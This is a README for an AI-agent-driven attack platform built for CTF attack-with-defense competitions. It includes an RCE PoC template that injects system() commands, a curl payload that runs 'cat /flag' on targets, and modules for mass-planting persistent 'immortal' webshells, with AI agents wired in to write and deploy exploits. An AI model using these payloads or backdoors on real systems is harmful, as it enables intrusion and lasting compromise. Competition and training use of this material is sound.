# 🚩 AWD-Red: Next-Gen AI Agent Driven Automated Attack Platform for AWD / AWD-Plus

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Architecture: Decoupled](https://img.shields.io/badge/Architecture-AI%20Decoupled-orange.svg)](#系统架构)
[![UI: Zero-Dependency](https://img.shields.io/badge/UI-Zero%20Dependency%20Web-purple.svg)](#web-控制台)

AWD-Red 是专为 CTF AWD (Attack With Defense) 及 AWD-Plus 攻防对抗赛设计的**下一代 AI Agent 解耦型自动化攻防攻击平台**。

平台彻底重塑了传统 AWD 自动化脚本与 AI 模型的协作范式：**将“深度安全研究与漏洞挖掘”和“高并发高频次攻击调度与提交”彻底解耦**。AI Agent 或人类选手仅需专注于单点代码审计与 PoC 编写，平台自动完成动态热编译、多目标并发打击、Flag 自动入库去重、多轮次周期提交与全景大盘态势监控。

---

## 目录
- [系统架构与核心哲学](#系统架构与核心哲学)
- [核心特性](#核心特性)
- [项目目录结构](#项目目录结构)
- [快速开始](#快速开始)
  - [1. 安装依赖](#1-安装依赖)
  - [2. 配置赛事参数](#2-配置赛事参数)
  - [3. 启动平台](#3-启动平台)
- [PoC 编写与交付规范 (五大硬契约)](#poc-编写与交付规范-五大硬契约)
- [五大配套 AWD Skills 武器库](#五大配套-awd-skills-武器库)
- [RESTful API 接口速查](#restful-api-接口速查)
- [安全与免责声明](#安全与免责声明)

---

## 系统架构与核心哲学

传统 AWD 脚本往往将漏洞利用逻辑、目标网络循环、Flag 提取正则、裁判机 HTTP 提交硬编码在一起，不仅单点阻塞、易因单一目标超时导致整轮丢分，更难以与现代化 LLM / AI Coding Agent 高效协同。

AWD-Red 采用分层解耦架构：

```
 ┌────────────────────────────────────────────────────────┐
 │            AI Agent (Antigravity / Claude / 人类)       │
 └───────────────────────────┬────────────────────────────┘
                             │
     ┌───────────────────────┼───────────────────────┐
     ▼                       ▼                       ▼
 1. 源码审计 & 录入      2. 生成标准 PoC         3. 批量持久化后门
 [awd-vulscan]          [awd-poc]               [awd-shell]
     │                       │                       │
     ▼                       ▼                       ▼
 ┌───────────────┐     ┌───────────────┐     ┌───────────────┐
 │ 漏洞库 API    │     │ incoming/ 目录│     │ backdoors 表  │
 └───────┬───────┘     └───────┬───────┘     └───────┬───────┘
         │                     │                     │
 ════════╪═════════════════════╪═════════════════════╪════════════
         │      AWD-Red 核心调度引擎 (Core Engine)     │
         ▼                     ▼                     │
 ┌───────────────┐     ┌───────────────┐             │
 │ SQLite WAL 库 │ ◄── │ 动态编译/就绪 │             │
 │ (platform.db) │     │ (pocs/ready/) │             │
 └───────┬───────┘     └───────┬───────┘             │
         │                     │                     │
         │             ┌───────┴────────┐            │
         │             │ 靶机并发执行池  │ ◄──────────┘
         │             │ (2s 硬超时熔断)│
         │             └───────┬────────┘
         ▼                     ▼
 ┌───────────────┐     ┌───────────────┐
 │ 全景 Web 控制台│ ◄── │ Flag 入库去重 │ ──► [awd-addflag]
 │ (127.0.0.1)   │     │ & 自动提交裁判机│
 └───────────────┘     └───────────────┘
```

1. **AI 专注审计，平台负责调度**：Agent 将挖掘出的漏洞通过 HTTP API 推送至平台漏洞库，编写出的标准 PoC 投递进 `pocs/incoming/` 即可立即退出去分析下一个漏洞。
2. **安全沙箱与编译准入**：平台文件系统监听器每 3 秒扫描一次 `incoming/`，经语法静态检查与安全编译提升至 `pocs/ready/` 参与高并发调度。
3. **零堵塞执行**：每个 PoC 针对单靶机独立执行，内置 2 秒硬超时熔断机制，任一靶机宕机或网络挂起绝不阻塞整体打击进度。
4. **事务级去重提交**：所有获取的 Flag 统一写入 SQLite WAL 模式数据库，基于唯一索引做毫秒级去重，后台守护进程根据设定的批次与间隔自动调用裁判机接口提交。

---

## 核心特性

- 🚀 **极速热加载 PoC 机制**：支持比赛进行中零重启热插拔 PoC，放入 `pocs/incoming/` 目录即刻生效。
- 🛡️ **健壮的超时熔断设计**：原生适配 AWD 恶劣网络环境，子进程双层超时控制，避免僵死连接拖垮调度器。
- 🎯 **多格式目标智能展开**：内置 `ConfigParser`，支持单 IP、CIDR 网段（`192.168.1.0/24`）、范围简写（`192.168.1.1-255`）及全网段范围展开，并支持赛事说明文本一键智能提取。
- 📊 **轻量自适应 Web 控制台**：基于原生 HTML5 + Vanilla JS 开发，零 npm 依赖，开箱即用。提供全盘态势看板、靶机存活矩阵、漏洞库一览、实时日志滚动与比赛配置面板。
- 🧩 **五大标准化 Agent Skills**：内置 `awd-poc`、`awd-vulscan`、`awd-shell`、`awd-addflag`、`awd-asset`，完美打通工具链。

---

## 项目目录结构

```
awd-red/
├── app.py                     # 平台主入口 (HTTP API + Web 控制台 + 调度器启动)
├── start.sh                   # 一键启动脚本 (自动初始化配置与虚拟环境)
├── stop.sh                    # 一键停止脚本
├── requirements.txt           # Python 依赖清单
├── core/                      # 平台核心引擎
│   ├── config.py              # 配置中心管理
│   ├── config_parser.py       # 赛事文本与 IP 范围智能解析器
│   ├── db.py                  # SQLite 数据库模型 (WAL 并发模式)
│   ├── executor.py            # 多目标并发执行器 (双层超时与进程池)
│   ├── manager.py             # PoC 热加载、编译提升与生命周期管理
│   ├── submitter.py           # Flag 统一提交客户端 (重试机制与状态流转)
│   └── cron.py                # 轮次管理与定时调度看门狗
├── config/                    # 比赛配置文件
│   ├── settings.json          # 平台运行参数 (轮次时间、取旗命令、并发数)
│   ├── submitter.json         # 裁判机提交接口与认证 Token
│   └── targets.txt            # 目标靶机 IPv4 列表 (支持网段与范围)
├── pocs/                      # PoC 仓库
│   ├── incoming/              # AI/人类编写完毕后的交付目录 (平台自动监听)
│   ├── ready/                 # 编译通过、已激活参与轮次调度的 PoC
│   ├── disabled/              # 手动禁用的 PoC
│   └── failed/                # 语法错误或执行异常自动降级的 PoC
├── tools/                     # 命令行辅助工具
│   └── flag_cli.py            # Flag 手动录入/管道提取/强制提交 CLI
├── web/                       # 纯前端控制台 (无 Node 依赖)
│   ├── index.html             # 单页控制台 HTML
│   ├── app.js                 # 控制台交互与轮询状态逻辑
│   └── style.css              # 现代化极简深色主题样式
└── skills/                    # 配套 AI Agent Skills (可直接软链到 Agent 目录)
    ├── awd-poc/               # PoC 标准模板生成与本地单目标验证
    ├── awd-vulscan/           # 源码免密拉取、D盾规则漏洞扫描与自动落库
    ├── awd-shell/             # 批量不死马 (Immortal Webshell) 投递与持久化
    ├── awd-addflag/           # 外部/反弹会话 Flag 录入与管道自动提取
    └── awd-asset/             # 资产管理、5秒探活看门狗与全景单页 WebUI
```

---

## 快速开始

### 1. 安装依赖

推荐使用 Python 3.10 或更高版本：

```bash
git clone https://github.com/your-org/awd-red.git
cd awd-red

# 创建并激活虚拟环境 (可选)
python3 -m venv .venv
source .venv/bin/activate

# 安装基础依赖
pip install -r requirements.txt
```

### 2. 配置赛事参数

平台提供了开箱即用的示例模板：

```bash
# 1. 复制配置模板 (若不存在)
cp config/settings.example.json config/settings.json
cp config/submitter.example.json config/submitter.json
cp config/targets.example.txt config/targets.txt
```

- **`config/settings.json`**：
  ```json
  {
    "round_time": 120,
    "max_workers": 20,
    "poc_timeout": 3,
    "get_flag_cmd": "curl -s http://10.0.0.1/get_flag",
    "flag_pattern": "flag\\{[a-zA-Z0-9_\\-]+\\}"
  }
  ```
- **`config/submitter.json`**：
  ```json
  {
    "url": "http://10.0.0.1/api/flag/submit",
    "method": "POST",
    "headers": {
      "Content-Type": "application/json",
      "Authorization": "Bearer YOUR_SUBMISSION_TOKEN"
    },
    "body_template": "{\"flag\": \"{flag}\"}",
    "success_keyword": "success",
    "repeat_keyword": "repeat"
  }
  ```
- **`config/targets.txt`**：
  ```text
  # 支持单 IP、范围或 CIDR 网段
  192.168.1.101
  192.168.1.102
  192.168.1.103-120
  ```

> 💡 **提示**：以上所有配置项也可以在平台启动后，直接通过 Web 控制台可视化界面进行修改与实时生效！

### 3. 启动平台

使用内置启动脚本：

```bash
./start.sh
```

启动成功后，浏览器访问控制台：
👉 **http://127.0.0.1:8800**

停止平台：
```bash
./stop.sh
```

---

## PoC 编写与交付规范 (五大硬契约)

为确保 AI Agent 编写的 PoC 能被平台高效、稳定、无差错地并发执行，所有 PoC 必须满足**五大契约**：

### 契约 1：双轨传参，主动读取取旗命令
- 必须支持接收 `sys.argv[1]` 作为目标 IP。
- 必须支持接收 `sys.argv[2]` 或环境变量 `GET_FLAG_CMD` 作为取旗命令，并提供读取自平台配置的 `DEFAULT_FLAG_CMD` 作为后备默认值。
- 本地单目标调试时无需传第二个参数即可独立运行。

### 契约 2：严格清理参数名前缀
- 从漏洞库读取参数时，严禁携带扫描器前缀（如 `REQUEST:a`, `POST:cmd`, `GET:id` 必须清洗为 `a`, `cmd`, `id`）。

### 契约 3：网络请求硬超时 <= 2 秒
- 所有的 `requests.get` / `requests.post` 必须显式设置 `timeout=2`（或 `(1, 2)`），严禁使用默认无限等待。

### 契约 4：标准输出纯净
- 输出仅打印获取到的 Flag 原文（若失败输出提示，但绝不能让未经处理的异常堆栈污染 stdout）。

### 契约 5：本地单机先测，后入 incoming/
- AI Agent 或选手编写完 PoC 后，必须执行一次 `python3 poc.py <测试IP>` 验证可用性，确认无异常后再移入 `pocs/incoming/`。

### 标准 PoC 参考实现模板

```python
#!/usr/bin/env python3
"""
AWD 标准 RCE PoC 示例模板
遵循 AWD-Red 5大硬契约规范
"""
import sys
import os
import re
import requests

# 契约 1: 固化默认取旗命令 (从平台配置自动继承)
DEFAULT_FLAG_CMD = "curl -s 'http://10.0.0.1/get_flag'"
FLAG_REGEX = re.compile(r"flag\{[a-zA-Z0-9_\-]+\}")

def exploit(target_ip: str, flag_cmd: str):
    url = f"http://{target_ip}:80/index.php"
    
    # 构造载荷并做安全转义
    escaped_cmd = flag_cmd.replace("'", "\\'")
    data = {
        # 契约 2: 参数名无 REQUEST:/POST: 前缀
        "cmd": f"system('{escaped_cmd}');"
    }

    try:
        # 契约 3: 严格设置 2 秒网络硬超时
        resp = requests.post(url, data=data, timeout=2.0)
        
        # 提取 Flag
        flags = FLAG_REGEX.findall(resp.text)
        if flags:
            # 契约 4: 纯净输出 Flag
            print(flags[0])
            return True
        else:
            # 无法解析出 Flag 时静默或简要提示
            return False
    except Exception as e:
        # 捕获异常，防止向 stdout 泄露大段报错
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 poc.py <target_ip> [flag_cmd]")
        sys.exit(1)

    target_ip = sys.argv[1].strip()
    # 契约 1: 双轨动态传参
    flag_cmd = sys.argv[2].strip() if len(sys.argv) > 2 and sys.argv[2].strip() else os.environ.get("GET_FLAG_CMD", DEFAULT_FLAG_CMD)

    exploit(target_ip, flag_cmd)
```

---

## 五大配套 AWD Skills 武器库

AWD-Red 在 `skills/` 目录下集成了 5 个标准化的 AI Agent 技能模块，可无缝对接任何 Agent（如 Antigravity CLI、Claude Code、Cursor 等）：

### 1. `awd-poc` (PoC 辅助与极速脚手架)
- **定位**：查询平台待利用漏洞，一键生成标准化 PoC 代码，提供本地单机测试套件。
- **核心命令**：
  ```bash
  # 查询漏洞库未利用漏洞
  python3 skills/awd-poc/scripts/poc_helper.py list
  
  # 为指定漏洞自动生成合规 PoC 模板
  python3 skills/awd-poc/scripts/poc_helper.py gen <漏洞ID>
  
  # 本地验证 PoC 可用性
  python3 skills/awd-poc/scripts/poc_helper.py test <PoC名称> <目标IP>
  ```

### 2. `awd-vulscan` (免密拉取与智能漏洞审计)
- **定位**：自动化通过 SSH 从防守机打包拉取源码，调用内置审计引擎执行静态代码审计，过滤 Level >= 3 的高危入口，自动入库至 AWD-Red 平台 `vulns` 表。
- **核心命令**：
  ```bash
  # 自动远程拉取源码并审计入库
  python3 skills/awd-vulscan/scripts/awd_vulscan.py --host 192.168.1.50 --user ctf --pass "ctfpass"
  
  # 对本地已有源码目录进行审计
  python3 skills/awd-vulscan/scripts/awd_vulscan.py ./awd_backups/192.168.1.50/html
  ```

### 3. `awd-shell` (批量不死马持久化植入)
- **定位**：从平台数据库读取已探明漏洞和存活目标，批量向对手靶机投递高隐蔽不死马（Dropper 自删 + 无限循环重写），并在 `backdoors` 表记录后门链接与访问凭据。
- **核心命令**：
  ```bash
  python3 skills/awd-shell/scripts/awd_shell.py run --flag-cmd 'curl http://10.0.0.1/get_flag' --json
  ```

### 4. `awd-addflag` (全场景 Flag 录入与提交)
- **定位**：支持命令行录入、日志管道过滤与正则表达式提取，录入后自动通过平台事务机制持久化并立即触发向裁判机提交。
- **核心命令**：
  ```bash
  # 录入单条并触发提交
  python3 tools/flag_cli.py add "flag{abcdef123456}" --ip 192.168.1.101 --submit
  
  # 管道模式自动正则提取
  curl -s http://192.168.1.101/curl.php -d "1=system('cat /flag');" | python3 tools/flag_cli.py pipe --submit
  ```

### 5. `awd-asset` (资产态势与独立全景大盘)
- **定位**：集中式目标资产数据库，后台 5 秒并发探活看门狗，自拉起单页全景 WebUI（`127.0.0.1:8090`）。

---

## RESTful API 接口速查

平台内置完整的 HTTP API，监听于 `127.0.0.1:8800`：

| 方法 | 路径 | 功能说明 |
|------|------|----------|
| `GET` | `/api/status` | 获取当前轮次态势、统计数据（存活靶机、PoC数量、Flag数） |
| `GET` | `/api/targets` | 获取当前全部目标列表及最新存活状态 |
| `POST`| `/api/targets` | 批量录入或覆盖目标列表 |
| `GET` | `/api/vulns` | 获取漏洞库中已审计录入的所有漏洞清单 |
| `POST`| `/api/vulns` | 外部审计工具录入新漏洞 |
| `GET` | `/api/pocs` | 列出当前 `ready`、`incoming`、`disabled`、`failed` 的全部 PoC |
| `POST`| `/api/pocs/toggle` | 动态启用 / 停用指定 PoC |
| `GET` | `/api/flags` | 查询最近捕获的 Flag 记录与裁判机返回状态 |
| `POST`| `/api/flags` | 外部脚本录入新 Flag 并触发去重排队 |
| `POST`| `/api/submit` | 手动强制触发一次待提交 Flag 的全量上报 |
| `GET` | `/api/settings` | 查询当前平台配置（轮次时长、取旗命令、并发数等） |
| `POST`| `/api/settings` | 更新平台配置并即时热生效 |
| `GET` | `/api/logs` | 实时流式读取平台轮次调度日志 |

---

## 安全与免责声明

1. **网络安全与隔离**：
   - 本平台默认**严格监听 `127.0.0.1` 本机回环地址**。严禁在未经认证鉴权的情况下将管理控制台（8800 端口）暴露至公网。
2. **免责声明**：
   - 本工具仅供网络安全攻防对抗演练（AWD / AWD-Plus / CTF 竞赛）、受控实验环境下的教学科研及经授权的安全测试使用。
   - 使用者须严格遵守《中华人民共和国网络安全法》及相关法律法规。因将本工具用于未经授权的非法测试所产生的一切后果，均由使用者本人承担，开发者不承担任何法律责任。

---

## 开源许可证

本项目基于 [MIT License](LICENSE) 开源发布。
欢迎提交 Issue 和 Pull Request 共建！
